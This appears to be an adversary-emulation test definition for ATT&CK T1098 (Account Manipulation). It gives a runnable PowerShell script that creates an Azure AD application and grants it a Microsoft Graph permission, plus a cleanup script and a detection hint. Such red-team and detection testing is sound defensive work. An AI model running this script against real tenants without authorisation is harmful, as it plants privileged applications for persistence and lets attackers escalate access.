- description: 'The adversaries want to add permission to newly created application.
    Application could be then used for persistence or for further operation in the
    attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory
    in particular can be a valuable target for a threat actor.

    This technique will create a new app, with the provided name, and give it the
    provided permission. But if you prefer to add credentials to an existing app,
    replace in the code: "Get-AzureADApplication" instead of "New-AzureADServicePrincipal".

    The DirectoryRecommendations.Read.All permissions has been selected as the default.


    The account you use to run the PowerShell command should have Global Administrator/Application
    Administrator/Cloud Application Administrator role in your Azure AD.


    Detection hint - check Operation Name "Add app role assignment to service principal"
    in subscriptions Activity Logs.

    You can also take a look at the materials:

    https://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/

    https://github.com/reprise99/Sentinel-Queries

    https://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766

    https://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb

    '
  id: 80d22fb154cc39b34d920f0855ce746e
  name: Azure AD - adding permission to application
  platforms:
    unknown:
      psh:
        cleanup: 'Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String
          "p4sswd" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential
          -ArgumentList "jonh@contoso.com", $Pword; Connect-AzureAD -Credential $Credential;
          $aadApplication = @(Get-AzureADApplication -Filter "DisplayName eq ''test_app''");
          If ($aadApplication.Count -eq 0); {;   Write-Host "App not found: cannot
          delete it";   exit; }; ElseIf ($aadApplication.Count -gt 1); {;   Write-Host
          "Found several app with name ''test_app'': one is likely the one this technique
          created, but as a precaution, none will be deleted. Manual cleanup is required.";   exit;
          }; Else; {;   Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId;   Write-Host
          "Successfully deleted app"; }'
        command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
          { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name
          AzureAD; $PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText -Force;
          $Credential = New-Object -TypeName System.Management.Automation.PSCredential
          -ArgumentList "jonh@contoso.com", $Pword; Connect-AzureAD -Credential $Credential;
          $aadApplication = New-AzureADApplication -DisplayName "test_app"; $servicePrincipal
          = New-AzureADServicePrincipal -AppId $aadApplication.AppId; $graphSP = Get-AzureADServicePrincipal
          -Filter "DisplayName eq 'Microsoft Graph'"; $requiredGraphAccess = New-Object
          Microsoft.Open.AzureAD.Model.RequiredResourceAccess; $requiredGraphAccess.ResourceAppId
          = $graphSP.AppId; $requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess];
          $ApplicationPermissions = @('DirectoryRecommendations.Read.All'); $reqPermission
          = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions};
          if($reqPermission); {; $resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess;
          $resourceAccess.Type = "Role"; $resourceAccess.Id = $reqPermission.Id    ;
          $requiredGraphAccess.ResourceAccess.Add($resourceAccess); }; else; {; Write-Host
          "App permission $permission not found in the Graph Resource API" -ForegroundColor
          Red; }; $requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess];
          $requiredResourcesAccess.Add($requiredGraphAccess); Set-AzureADApplication
          -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess;
          $servicePrincipal = Get-AzureADServicePrincipal -Filter "AppId eq '$($aadApplication.AppId)'";
          New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId
          -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id
          $reqPermission.Id
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
        payloads: []
  tactic: multiple
  technique:
    attack_id: T1098
    name: Account Manipulation
